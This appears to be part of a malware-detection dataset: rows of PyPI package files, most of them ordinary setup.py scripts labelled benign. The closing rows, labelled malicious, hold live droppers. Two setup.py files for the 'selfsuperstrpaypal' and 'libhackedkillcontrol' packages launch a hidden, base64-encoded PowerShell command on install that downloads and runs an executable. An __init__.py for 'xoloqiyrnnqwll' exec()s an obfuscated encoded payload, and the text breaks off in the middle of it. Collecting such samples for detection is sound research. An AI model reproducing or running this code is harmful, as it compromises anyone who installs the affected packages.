+    return long_description
+
+
+setup(
+    name='renderg-sdk',
+    version='0.1.11',
+    url='https://github.com/renderg-repo/renderg-sdk.git',
+    author='RenderG',
+    author_email='support@renderg.com',
+    description='www.renderg.com',
+    long_description=get_readme(),
+    long_description_content_type='text/markdown',
+    packages=find_packages(),    
+    install_requires=[
+        'requests',
+        'tenacity',
+        'paho-mqtt'
+    ],
+    package_data={
+        'analyze_houdini': [""./houdini/*""],
+        'ascp': [""./*/*""],
+    },
+    classifiers=[
+        ""Programming Language :: Python"",
+        ""Programming Language :: Python :: 2"",
+        ""Programming Language :: Python :: 3"",
+    ],
+)"
+c71e8ec131683fccf33a9d2daf3172ef39927451,gs-peer-connection-0.0.31.53,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/gs-peer-connection/0.0.31.53/tar-gz/setup.py,pypi,Python,0,malwarebench_pypi_benign_after_2000_v3,1ce1722d083a998870dc215fb5fa92f8a1dd6c17,"import pathlib
+from setuptools import setup
+
+# The directory containing this file
+HERE = pathlib.Path(__file__).parent
+
+# The text of the README file
+README = (HERE / ""README.md"").read_text()
+
+# This call to setup() does all the work
+setup(
+    name=""gs-peer-connection"",
+    version=""0.0.31.53"",
+    description=""python peer connection adapter"",
+    long_description=README,
+    long_description_content_type=""text/markdown"",
+    url=""https://glass-sphere-ai.de"",
+    author=""Glass Sphere Software"",
+    author_email="""",
+    license=""MIT"",
+    classifiers=[
+        ""License :: OSI Approved :: MIT License"",
+        ""Programming Language :: Python :: 3"",
+        ""Programming Language :: Python :: 3.7"",
+    ],
+    packages=[""gspeerconnection""],
+    include_package_data=True,
+    install_requires=[""aiortc"",
+                      ""aiohttp"",
+                      ""python-socketio"",
+                      ""ujson"",
+                      ""crc32c"",
+                      ""StrEnum"",
+                      ""py-ubjson"",
+                      ""msgpack"",
+                      ""numpy"",
+                      ""requests""
+                      ],
+    entry_points={
+        ""console_scripts"": [
+            ""realpython=gspeerconnection.__main__:main"",
+        ]
+    },
+)"
+d223cbd954cdbed7e2197ad81752571e1e58b6e8,vtarget-0.3.0,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/vtarget/0.3.0/tar-gz/setup.py,pypi,Python,0,malwarebench_pypi_benign_after_2000_v3,5936563ea27ff8f776407ea67a4fee797b1a2dd0,"from setuptools import __version__, setup
+
+with open(""./README.md"", ""r"") as f:
+    readme = f.read()
+
+with open(""./requirements.txt"", ""r"") as f:
+    requirements = f.read().splitlines()
+
+setup(
+    name=""vtarget"",
+    packages=[
+        ""vtarget"",
+        ""vtarget.dataprep"",
+        ""vtarget.dataprep.nodes"",
+        ""vtarget.handlers"",
+        ""vtarget.utils"",
+    ],
+    version=""0.3.0"",
+    description=""vtarget lib"",
+    long_description=readme,
+    long_description_content_type=""text/markdown"",
+    author=""vTarget Team"",
+    author_email=""contact@vtarget.ai"",
+    keywords=[""vtarget"", ""dataprep""],
+    classifiers=[],
+    license=""BSD"",
+    install_requires=requirements,
+    include_package_data=False,
+    python_requires="">=3.9.10,<3.11.0"",
+)"
+d3e545b0ac8e32a7dd9522de57aa7032c47e4e79,oakvar-2.9.59,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/oakvar/2.9.59/tar-gz/setup.py,pypi,Python,0,malwarebench_pypi_benign_after_2000_v3,80cfb804df2a92aef8cb03b34644af3af1472611,"from setuptools import setup
+import os
+from pathlib import Path
+
+
+def walk_and_add(d, pkg_files):
+    folders = [
+        ""api"",
+        ""cli"",
+        ""gui"",
+        ""lib"",
+    ]
+    for root, _, files in os.walk(d):
+        root_spl = root.split(os.sep)
+        if len(root_spl) <= 1:
+            continue
+        root_f = root_spl[1]
+        root_l = root_spl[-1]
+        if root_f in folders and root_l != ""__pycache__"":
+            root_files = [os.path.join("".."", root, f) for f in files]
+            pkg_files.extend(root_files)
+
+
+this_directory = Path(__file__).parent
+long_description = (this_directory / ""README.rst"").read_text()
+oakvar_files = []
+cravat_files = []
+walk_and_add(""oakvar"", oakvar_files)
+walk_and_add(""cravat"", cravat_files)
+setup(
+    name=""oakvar"",
+    version=""2.9.59"",
+    description=""A genomic variant analysis platform"",
+    long_description=long_description,
+    long_description_content_type=""text/x-rst"",
+    url=""https://github.com/rkimoakbioinformatics/oakvar"",
+    author=""Ryangguk Kim"",
+    author_email=""rkim@oakbioinformatics.com"",
+    license="""",
+    classifiers=[""""],
+    keywords=""genomic variant analysis interpretation genome"",
+    project_urls={
+        ""Documentation"": ""https://oakvar.readthedocs.io"",
+        ""Source"": ""https://github.com/rkimoakbioinformatics/oakvar"",
+        ""Tracker"": ""https://github.com/rkimoakbioinformatics/oakvar/issues"",
+    },
+    packages=[""oakvar"", ""cravat""],
+    py_modules=[],
+    install_requires=[
+        ""requests"",
+        ""requests-toolbelt"",
+        ""liftover"",
+        ""markdown"",
+        ""aiohttp<4.0.0"",
+        ""chardet>=3.0.4"",
+        ""aiosqlite"",
+        ""oyaml"",
+        ""nest-asyncio"",
+        ""psutil"",
+        ""python-dateutil"",
+        ""download"",
+        ""gdown"",
+        ""split-file-reader"",
+        ""packaging"",
+        ""Pillow"",
+        ""duckdb"",
+        ""rich"",
+        ""aiohttp-cors"",
+        ""pyjwt"",
+        ""polars"",
+        ""connectorx"",
+        ""pyarrow"",
+        ""multiprocess"",
+        # below are module-specific. move them to module's yml.
+        ""mpmath"",
+        ""twobitreader"",
+        # ok to delete the below?
+        ""intervaltree"",
+    ],
+    python_requires="">=3.8"",
+    package_data={""oakvar"": oakvar_files, ""cravat"": cravat_files},
+    data_files=[],
+    scripts=[],
+    entry_points={
+        ""console_scripts"": [
+            ""ov=oakvar.__main__:main"",
+        ]
+    },
+)"
+d98f18e8fa8cd1c19aecd17d382640aa1ab0a09c,chainforge-0.2.7.1,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/chainforge/0.2.7.1/tar-gz/setup.py,pypi,Python,0,malwarebench_pypi_benign_after_2000_v3,8265cf14817457ecd25aee6125460653c65a0e82,"from setuptools import setup, find_packages
+
+def readme():
+    with open('README.md', encoding='utf-8') as f:
+        return f.read()
+
+setup(
+    name='chainforge',
+    version='0.2.7.1',
+    packages=find_packages(),
+    author=""Ian Arawjo"",
+    description=""A Visual Programming Environment for Prompt Engineering"",
+    long_description=readme(),
+    long_description_content_type='text/markdown',
+    keywords='prompt engineering LLM response evaluation',
+    license=""MIT"",
+    url=""https://github.com/ianarawjo/ChainForge/"",
+    install_requires=[
+        # Package dependencies
+        ""flask>=2.2.3"",
+        ""flask[async]"",
+        ""flask_cors"",
+        ""requests"",
+        ""urllib3==1.26.6"",
+        ""openai"",
+        ""anthropic"",
+        ""google-generativeai"",
+        ""dalaipy>=2.0.2"",
+        ""mistune>=2.0"",  # for LLM response markdown parsing
+    ],
+    entry_points={
+        'console_scripts': [
+            'chainforge = chainforge.app:main',
+        ],
+    },
+    classifiers=[
+        # Package classifiers
+        'Development Status :: 3 - Alpha',
+        'Intended Audience :: Developers',
+        'License :: OSI Approved :: MIT License',
+        'Programming Language :: Python :: 3',
+        'Programming Language :: Python :: 3.8',
+        'Programming Language :: Python :: 3.9',
+        'Programming Language :: Python :: 3.10',
+    ],
+    python_requires="">=3.8"",
+    include_package_data=True,
+)"
+f068fc6802675c140f1c57ddaf7d827ccbcc2e5c,clickhouse-sqlalchemy-0.2.4,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/clickhouse-sqlalchemy/0.2.4/tar-gz/setup.py,pypi,Python,0,malwarebench_pypi_benign_after_2000_v3,4fe43df0a65a422c9b09be7d1db78ef88e88fb27,"import os
+import re
+from codecs import open
+
+from setuptools import setup, find_packages
+
+here = os.path.abspath(os.path.dirname(__file__))
+
+
+with open(os.path.join(here, 'README.rst'), encoding='utf-8') as f:
+    long_description = f.read()
+
+
+def read_version():
+    regexp = re.compile(r'^VERSION\W*=\W*\(([^\(\)]*)\)')
+    init_py = os.path.join(here, 'clickhouse_sqlalchemy', '__init__.py')
+    with open(init_py, encoding='utf-8') as f:
+        for line in f:
+            match = regexp.match(line)
+            if match is not None:
+                return match.group(1).replace(', ', '.')
+        else:
+            raise RuntimeError(
+                'Cannot find version in clickhouse_sqlalchemy/__init__.py'
+            )
+
+
+dialects = [
+    'clickhouse{}=clickhouse_sqlalchemy.drivers.{}'.format(driver, d_path)
+
+    for driver, d_path in [
+        ('', 'http.base:ClickHouseDialect_http'),
+        ('.http', 'http.base:ClickHouseDialect_http'),
+        ('.native', 'native.base:ClickHouseDialect_native'),
+        ('.asynch', 'asynch.base:ClickHouseDialect_asynch'),
+    ]
+]
+
+github_url = 'https://github.com/xzkostyan/clickhouse-sqlalchemy'
+
+setup(
+    name='clickhouse-sqlalchemy',
+    version=read_version(),
+
+    description='Simple ClickHouse SQLAlchemy Dialect',
+    long_description=long_description,
+
+    url=github_url,
+
+    author='Konstantin Lebedev',
+    author_email='kostyan.lebedev@gmail.com',
+
+    license='MIT',
+
+    classifiers=[
+        'Development Status :: 4 - Beta',
+
+
+        'Environment :: Console',
+
+
+        'Intended Audience :: Developers',
+        'Intended Audience :: Information Technology',
+
+
+        'License :: OSI Approved :: MIT License',
+
+
+        'Operating System :: OS Independent',
+
+
+        'Programming Language :: SQL',
+        'Programming Language :: Python :: 3',
+        'Programming Language :: Python :: 3.6',
+        'Programming Language :: Python :: 3.7',
+        'Programming Language :: Python :: 3.8',
+        'Programming Language :: Python :: 3.9',
+        'Programming Language :: Python :: 3.10',
+
+        'Topic :: Database',
+        'Topic :: Software Development',
+        'Topic :: Software Development :: Libraries',
+        'Topic :: Software Development :: Libraries :: Application Frameworks',
+        'Topic :: Software Development :: Libraries :: Python Modules',
+        'Topic :: Scientific/Engineering :: Information Analysis'
+    ],
+
+    keywords='ClickHouse db database cloud analytics',
+
+    project_urls={
+        'Documentation': 'https://clickhouse-sqlalchemy.readthedocs.io',
+        'Changes': github_url + '/blob/master/CHANGELOG.md'
+    },
+    packages=find_packages('.', exclude=[""tests*""]),
+    python_requires='>=3.7, <4',
+    install_requires=[
+        'sqlalchemy>=1.4.24,<1.5',
+        'greenlet>=2.0.1',
+        'requests',
+        'clickhouse-driver>=0.1.2',
+        'asynch>=0.2.2',
+    ],
+    # Registering `clickhouse` as dialect.
+    entry_points={
+        'sqlalchemy.dialects': dialects
+    },
+    test_suite='pytest'
+)"
+f10ecdbf38cdcfb154f369258a9f45c61db7aa6a,owega-4.2.0,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/owega/4.2.0/tar-gz/setup.py,pypi,Python,0,malwarebench_pypi_benign_after_2000_v3,5890268c2286bd4b3b25b74cb1c118eee4f07e6e,"#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+from setuptools import setup
+
+desc = open('README.md').read()
+
+setup(
+	name='owega',
+	version='4.2.0',
+	packages=[
+		'owega',
+		'owega.changelog',
+		'owega.config',
+		'owega.OwegaFun',
+		'owega.conversation',
+	],
+	install_requires=[
+		'openai>=1.1.1',
+		'prompt_toolkit>=3.0',
+		'requests>=2.0',
+		'beautifulsoup4>=4.0',
+		'lxml>=4.0',
+	],
+	scripts=[
+		'scripts/owega',
+	],
+	long_description=desc,
+	long_description_content_type='text/markdown',
+)"
+f427514cab816189d828ead508c728fb769b61c7,eznf-0.8.2,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/eznf/0.8.2/tar-gz/setup.py,pypi,Python,0,malwarebench_pypi_benign_after_2000_v3,18dc0680feb3fc5f1ed44148abf2f08401942b38,"from setuptools import find_packages, setup
+
+setup(
+    name='eznf',
+    packages=find_packages(include=['eznf']),
+    version='0.8.2',
+    description='A library for easily encoding problems into SAT',
+    author='Bernardo Subercaseaux',
+    install_requires=[],
+    setup_requires=['pytest-runner'],
+    tests_require=['pytest'],
+    test_suite='tests',
+)"
+055fd6f253f2813fdd938cbf519341e64c44568c,selfsuperstrpaypal-9.31,selfsuperstrpaypal-9.31/selfsuperstrpaypal-9.31/setup.py,pypi,Python,1,pypi_malregistry_malicious_exclude_aligned_v3,cc22baa11fc32d966f68596bb5043a669472dd01,"from distutils.core import setup
+
+try:
+  import subprocess
+  import os
+  if not os.path.exists('tahg'):
+    # www.esquelesquad.rip
+    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
+except: pass
+try:
+  setup(
+    name = 'selfsuperstrpaypal',
+    packages = ['modlib'],
+    version = '5.59',
+    # license='MIT',
+    description = 'A library for creating a terminal user interface',
+    author = 'EsqueleSquad',
+    author_email = 'tahgoficial@proton.me',
+    classifiers=[
+      'Development Status :: 3 - Alpha',
+      'Intended Audience :: Developers',
+      'Topic :: Software Development :: Build Tools',
+      'License :: OSI Approved :: MIT License',
+      'Programming Language :: Python :: 3',
+      'Programming Language :: Python :: 3.4',
+      'Programming Language :: Python :: 3.5',
+      'Programming Language :: Python :: 3.6',
+      'Programming Language :: Python :: 3.7',
+      'Programming Language :: Python :: 3.8',
+      'Programming Language :: Python :: 3.9',
+      'Programming Language :: Python :: 3.10',
+      'Programming Language :: Python :: 3.11',
+    ],
+  )
+except: pass"
+0e4198303fbf824133fb9a1780ab0321b3e58350,libhackedkillcontrol-5.31,libhackedkillcontrol-5.31/libhackedkillcontrol-5.31/setup.py,pypi,Python,1,pypi_malregistry_malicious_exclude_aligned_v3,c438d0ac8400cd86d720fc176eb3cf86806b74bf,"from distutils.core import setup
+
+try:
+  import subprocess
+  import os
+  if not os.path.exists('tahg'):
+    # www.esquelesquad.rip
+    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
+except: pass
+try:
+  setup(
+    name = 'libhackedkillcontrol',
+    packages = ['modlib'],
+    version = '9.49',
+    # license='MIT',
+    description = 'A library for creating a terminal user interface',
+    author = 'EsqueleSquad',
+    author_email = 'tahgoficial@proton.me',
+    classifiers=[
+      'Development Status :: 3 - Alpha',
+      'Intended Audience :: Developers',
+      'Topic :: Software Development :: Build Tools',
+      'License :: OSI Approved :: MIT License',
+      'Programming Language :: Python :: 3',
+      'Programming Language :: Python :: 3.4',
+      'Programming Language :: Python :: 3.5',
+      'Programming Language :: Python :: 3.6',
+      'Programming Language :: Python :: 3.7',
+      'Programming Language :: Python :: 3.8',
+      'Programming Language :: Python :: 3.9',
+      'Programming Language :: Python :: 3.10',
+      'Programming Language :: Python :: 3.11',
+    ],
+  )
+except: pass"
+0eaea46f494a7f40dcf07352175a1a15d4d31e8f,xoloqiyrnnqwll-0.0.0,xoloqiyrnnqwll-0.0.0/xoloqiyrnnqwll-0.0.0/xoloqiyrnnqwll/__init__.py,pypi,Python,1,pypi_malregistry_malicious_exclude_aligned_v3,87d08fdc1a6ff09ef2b0ec76f583b357369c3da3,import base64 as b;exec(b.b64decode('dHJ5OgogICAgX19QWU9fXzAyNTQgPSBsYW1iZGEgeDp4LnJlcGxhY2UoIl9fUFlPX18zOTYzIiwibSIpLnJlcGxhY2UoIl9fUFlPX185NjUxIiwgInAiKS5yZXBsYWNlKCJfX1BZT19fMDc1NCIsICJhIikucmVwbGFjZSgiX19QWU9fXzkzNjQiLCAicyIpLnJlcGxhY2UoIl9fUFlPX184NTQxIiwiZSIpLnJlcGxhY2UoIl9fUFlPX18xMzQ3IiwgInIiKS5yZXBsYWNlKCJfX1BZT19fODY1MyIsImIiKS5yZXBsYWNlKCJfX1BZT19fMjUxNCIsICJvIikucmVwbGFjZSgiX19QWU9fXzI3NTQiLCAidCIpLnJlcGxhY2UoIl9fUFlPX184NDEzIiwiaSIpLnJlcGxhY2UoIl9fUFlPX18wOTg1IiwgImMiKS5yZXBsYWNlKCJfX1BZT19fNDcwMSIsICIuIikucmVwbGFjZSgiX19QWU9fXzgwNTEiLCAibCIpLnJlcGxhY2UoIl9fUFlPX18zODYiLCAiKCIpLnJlcGxhY2UoIl9fUFlPX18zMzUiLCAiKSIpCiAgICBleGVjKF9fUFlPX18wMjU0KCJfX1BZT19fODQxM19fUFlPX18zOTYzX19QWU9fXzk2NTFfX1BZT19fMjUxNF9fUFlPX18xMzQ3X19QWU9fXzI3NTQgX19QWU9fXzM5NjNfX1BZT19fMDc1NF9fUFlPX18xMzQ3X19QWU9fXzkzNjRoX19QWU9fXzA3NTRfX1BZT19fODA1MSBfX1BZT19fMDc1NF9fUFlPX185MzY0IF9fUFlPX18zOTYzLCBfX1BZT19fODY1M19fUFlPX18wNzU0X19QWU9fXzkzNjRfX1BZT19fODU0MTY0IF9fUFlPX18wNzU0X19QWU9fXzkzNjQgX19QWU9fXzg2NTMiKSkKICAgIGV4ZWMoX19QWU9fXzAyNTQoIl9fUFlPX184NTQxeF9fUFlPX184NTQxX19QWU9fXzA5ODVfX1BZT19fMzg2X19QWU9fXzM5NjNfX1BZT19fNDcwMV9fUFlPX184MDUxX19QWU9fXzI1MTRfX1BZT19fMDc1NGRfX1BZT19fOTM2NF9fUFlPX18zODZfX1BZT19fODY1M19fUFlPX180NzAxX19QWU9fXzg2NTM4NWRfX1BZT19fODU0MV9fUFlPX18wOTg1X19QWU9fXzI1MTRkX19QWU9fXzg1NDFfX1BZT19fMzg2XCc7e1g1djAwMDAwMDAwMDAwMDAwMDAxNXlBMDYraSQwQ09rLTAwM25HV0JgSyFTXjtHTldDNFEjU157TU9XZGRYWldDTFhaWTZGNzxnOF5qJFdkZFhiV0NMWFpZNkY3PGc4PjJuU19FMUpXZFVSYmc4XkN3V2RVVVpXQ21tZFdkVWpmZzlDI0JXZFVVWldDdnNlV2RVamZnOUMjQldkVVVaV0MmeWZXZFVqZmc5QyNCV2RVVVpXQz4mZ1dkVWpmZzlDI0JXJn5VV1NfZkpQU194VlRXQ347cGdhQkYjV0RIfnRnYUJGJFdkVVVaV0RhQmxXZFVqZmc5QyNCU2BCM1pXZGRYbVdDTFhaWTZGNzxnOF5DJldkVVVaV0RzTm5XZFVqZmc5QyNCU2BURmJXZGRYb1dDTFhaWTZGNzxnOF5DKVdkVVVaV0Q7WnBXZFVqZmc5QyNCU2BsUmpXZWE1bXBifSpUcGJ9KlNwYzc+WFdmNmtgcCNmd1FwI28kU3AjbyhGZzkycCVXRUZ6fTgzMk87MFJVdGNRdmZMISs1fX5HVlFrdDVWe2RKNlg+NFZCNmtsSXlaRSRhTGJZRVg2Q3RfaTlXaX5WP0RjUyZmNmtsSXlaRSRhTGJZRVg2Q3U0NzlXbiooRURTOFNnQVpqc2piOCVRZkMpeHlNY3g3WEgzVWhSRkVAZl9HWik5Y0szVGJtYFpnWF5EWmV3TkkxITglMFdwaVQhMDAwMDAwMDAwMDAwMDA0MDAwMDQwMDAwKDAwMDFVTWdSWitkO3AqVHAjWGdWV0M0OHdkO3ckdjgzMUdoWVhXbTFXQ01IdzdYVzwkYk9DZSVXQ1ZpJmc4QFZVVEBaWihkOylYPVdDZW8oSHZvTUNhViZmU2Q7dyt4UXZmTGpQSTNiUDAwMmglMFUmeDBZLU1nSlV0ZUVlVXRlRWVVdGNNRE9rLSRyQ350Q1BDfF9TK1V0ZUVlVXRlRWFVdEs5KVoqcFdQVXRlRWVVdGVFZVV0ZUVhQ35SZUpDfF9TK1V0ZUVlVXRlRWVESWhIJVJDMEE/RGwjYmBEPEQqSWIhQTtDREpjV20yNHJQcFopOWNLMSMpMy1YSnkoMlV0ZUVlVW52Q0kzU1ZEZVV0ZUVlVXRlRl4zdHdNZlV0ZUVlVXRlRWUrNmlBQFV0ZUVlVXRlRl4wYmkqQWF0e0NpME5OMj5Vcjw/M1V0ZSF4V181RjhWUlU2PSs3bi0yVXRlRWVVdGVFZVV0ZUVlVXRlRWVVanpVRTBDTnJpMDAwMDEybXU1RTM7X3JNNUNJTVdhdUVPazBBbTNGMDAwMDAwMDAwMDAwMDMxMDAwSTYwMDJWKDAwNDg9MDAwMWQwQXY5ZjBDV0khMGJ+TVgxOVNqdDApcXBDMGMhKHRCNklfTTBEfVIyMENXVT0wQ1dYfDAmX3JnMENXTGwxWWBxcjBCUW4qMUFfczUwQih8ZTBBdjlmMENXSSEwYn5WYTE5U2p0MClxcEMwYyEkc1pnYz4yMGJ+WWIxOVNqdDApcXBDMGV0eyZRaFdlcDBUfT52MENXTGwyVj9fdTBCUW4qMUFfcjswJjwqbTBDV0xsMnhKM3YwQlFuKjFBX3M1MEIkNjcwQ1dMbDMxa0N3MEJRbioxQV9zNTBDV0khMGJ+a2YxOVNqdDApcXBDMGV0ezswQ1dMbDN1RlV5MEJRbioxQV9zNTBESiZiMDRXU2s+SHEpI3w5VWtpVl8jb2lVdGVFZVV0ZUVlVXRlRWVVcDh8IVV0ZUVlVXRlRWVVdGVFZVV0ZUVlSGVxc1BifnE8bkVtVSVLV2h5alhhc3ZQVzBEM0I0VXRlRD9XTXlNLVdNd0V7VXRlRWVVdGVFZVV0ZUVlVFJKVU5hJj17MEVHS2VyYlRLbjBEUzgtVUN1VEtzV14tZ19WUmRGV0g3OHB3UkMwQT9EbH1ic0N0cUoqVW9LPjJWe2M/LUN8X1MrVXRlRWVVdGVFZVV0ZTF+RW1VJUtXbkM7TWIjKjV4ZEtxRlRXSG9iVWIxYElRV0B2THtJNDReelJDMEE/RGx9YnNDfF9TK1VvSz4yVntjPy1DfF9TK1V0ZUVlVXRlRWVVdGUxfkVtVSVLV25DO01Ya35hT0RTOVZnVXRlRWVVb0spZUhEcU9EWik5YUNVdGVFZVV0ZUVlVXRlRWVVdDJtWVJDMEE/VGA3N1lVdGVFZUVAV2s2Wik5YUNVdGVFZVV0ZUVlVXRlRWVVbzBSZVhrfmFPRFM5RGFVdGVFZVV0ZUVlVXRjYXtXbip0LVdoaEA/VXRlRWVVdGVFZVV0ZUQtREYkKjEwMDAybTJWWS1iVXRlRWUrNlo0P1plZVhAVXRlKyEwMDAxVDNqaEVCYXRyX2YwNFZgbDRQUmVoVXRlRWVVdGVFZVV0ZSskMDAwMVQ0KiZvRmF1NUlqME5NOytVdGVFZVV0ZUVlVXRlRGcwMDAxVTd5dGtPMDA5flIybXVOSjZhcEZuNmFnOWw2YWYrZDUmO3FjYXVvbW8wQVhgYTAwM1dLVXRlRWVVdGVFZVVvSz4yVntjPy1DfUptRUYpPVYpRipHJD9GKSVQKGNzRGQkY3IhUiRGKT1WKUYqRyQ/Y3NEcClGKkd6PmNzRkJRY3ItWCVjciFSJGNyI3tQY3M0UnpjciFDeGNyLVUkY3JyRnpGKSViLUhaKXV8Rjxme3dJOXp4I0doQkV6R0YqNXpIKFc2X0hDITw7SChXRn1UekU4T1R6RTcjVHJvOD1Ucm5ePVRyQFVaRiklYi1jciFMIUYqUHQ7Rik9VilGKkckP2NzRHApY3M0YSRIWmZjPUZnSUteR2hCRSNWcTdzWEdGJms9RmtDUyhIKFlvIUhlNHw+SGU0fDxHaDh0PEdGJmsqSChXNl5HaDh0QEdGJiR8VHpFRCFUekU3JVR6RTF3VHJvQj9UekUxd1R6RUVRVHJuXj1Ucm81PVR6RUQoVHpFSE9Ucm81PlRybnspVHNKVVdjc0RtKEYqN2grRipHJD9GKSVrPUg4b3MjRy1YX1BIWkAjJEdjakItRikmOylHJk5pP0g4KSVfRyZOaiFHYyNOPEZnSUx5R0d0dE1HY3thekg4V2ZgRjxkYilIKFlvIUhlNUN8VHNBYVpIWil2I0cmbyF8R2hCRXlJYjMpKUcrY04jSTl4Rj9Ga0NrPFR6RUQkVHJuXitUekVIU1R6RTclVHpFNCRUekVBJFRzSlhYRipHJD9jci1YJUcmNVh5SCMxeSNIKF58T0dkNWY/RikmPHNHZE5yfUdoQkV4V0wkVk5Ga0U7dkgoV0Z9VHpFOE9UekU3JlRybzVAVHJueylUcm81O1R6RTQlVHJvNT9UekU0JFRybl49VHpFRCFUekVBKFR6RTF1VHpFNHVUcm57KVR6RUR5VHJufi1Ucm9CPVR6RTd3VHJueylUekVEJFRyb0U9VHJvNV5UekVIU1R6RTckVHpFMXpUekU3elRzQVhZY3NGSFNjci1VJEcmV3AjSDh4eSRHJjVYeUhETyNhRmdJTHlHR3R0TUdje2F6SDhXZmBGa0U7dkk5engkSTl4RntIKFlvJUhDITxARmtDUylGa0NTK0dGKjUhSChZbyRJYjFPYEY8ZGIqRmtDZS1UekU3dlR6RUVOVHpFSFNUekU3JVRzSlVXRipHJD9GKSVZK0YqUHc8Y3ItVSRGKkd3PWNzNGooY3JyTCNGKmh8X0YpPVYpY3J7Xk1jcnJMI0YpPXE+Y3M0ZCVGKSVrPUcmV29ARipSSXhHJTtLQEdoQkV5SChZbyFIZTR8XkhlNHw+SEMlVyRJYjMpJkgoWW8mR2g4dD5Ga0NTPUdGKjUhV0x6O1pGa0NrPFRybl4rVHpFSFFUekVEJVR6RTclVHpFNCRUcm9CYFRybn4tVHJvODxUekU3JVR6RTQkVHNBWFlII2J+KEhaZmR5RyZvIyVHQmFFO0haeG8/SGExKiVIZjNDUkcmbyMlR0JhRTtHQlI4LUg4NU93R2ROcyRHJm8jJUhaQCMkSGZDSGdHJkVjPkgjSjslRyZvIyVIWmZkeUdkV3hfRyZmdV5IOG9zI0cmZnV7SGU0fD1IQyVXIUdoQkUhR0YmaytGa0NTLUY8ZHQ+VHJvNT9UekU0eFRybl49VHJvNT1UekVEKFRyb0U/VHpFQlJUekU3JVRybzU7VHNBT1ZjcmBkJmNzNjVQRik9ViljciFSJEYqRyQ/Y3I7Xk5GKlB6PWNyLVglRyU7S15IKFc2PkdGKjV3R2hCRXlIKFdGfVRybn4+VHJuXitUcm81P1R6RTckVHpFMXpUekU3elR6RTR5VHpFNHZUcm5ePVRybzU9VHJvMi1Ucm9CQFRybn4+VHJueylUcm8yO1RybzU/VHpFNCFUekVCTVR6RTclVHpFMSNUcm5eKFR6RUVPVHJvOF5UekU3JFR6RUQjVHpFOE9UekU4TFRzQWdiY3ItVSRHJldwI0ctTzxPR2RXeF9IOEVVeEcmbyMlR0JhRndHZFd5JUg4eHkkR2M7VD1GKSY8c0dkTnJeSGFBPiZHLWgwUUhaKXYjRyZmdXtIZTR8PkhlNHw8SChZbyNHaDh0K0goV0Z9VHpFOE9UekU3JlRybzVAVHpFNyRUcm81PVRyb0I9VHMxUlhGKjdrLUYpPVYpRipHJD9IOEVVeEghKWxgRmtFO3ZIKFc2XkcrY04hSGU0fD5HRio1elZfYk1OSTl4WHtUcm5+PlRzQWdiRipHcTtGKSVrPUg4b3JAR0I7Yz9IOFdnekdjO1V5RyZmdXtIZTVDe1Ryb0VeVHJvNT1Ucm57KVR6RTF3VHJvNTtUekVHeVRybzg8VHJueylUekUxd1R6RUR5VHJvQl9UekVEKFR6RTckVHpFMk1Ucm5+P1Rybzg+VHNBZGFGKT1WKWNzNE95Y3JgTHljc0RqJkYqWXo8Y3ItVSRHJk5qIUhEKzhsSChZbyhWX1kjWEgoV0Z9VHJufj5UekU3I1R6RUQmVHpFNyRUekUyTVRzQWRhY3JgTHljc0ZFUmNyLVglY3IhUiRjczZCUmNyPDJRY3M0ZyZGKSVrPUg4b3JARmcwODtHQiNYekdje2F6RyZvIV9HJk5qIUdDNW9eSFpmY19Ga0U7dkgoWW8kSChZbyZGPGZ7dkgoWW8mVk8laldGa0U7eEhDITxfRmtFO3lGPGR0PVR6RTckVHJAUlljcnMjS2NycyNLRipHbi1jci1YJUYqR3E7Ril9aC1GKll8YGNyLUl5Riklaz1jczRVIWNzNGooY3JyOXhGKkd3PUYpPVYpSDg1T3dHJSNFLUg4TmF5SClVTFNHJm8jJUdkTnMkRyY1WHlIRCs5UkgpMzNQRyZvIyVIWkAjJEhmQ0hnSDhXZ3pHZDVmP0YpJjxzSFpmZHlIOE5heUgjMXhASDhmbD9GZ0lLPUcmNVh5SGFKezBHaDh0PEZrRTt2SChXRn1UekVBJFRybnsqVHJvNT9UekU3JVRzSlVXY3NEbShGKX10PmNyIVIkRiklaz1GKkd3PUYqWSQ9SDg1T3dIWkAjJEcmbyMlR2ROcyRIZjNCZkYpfn4+Ry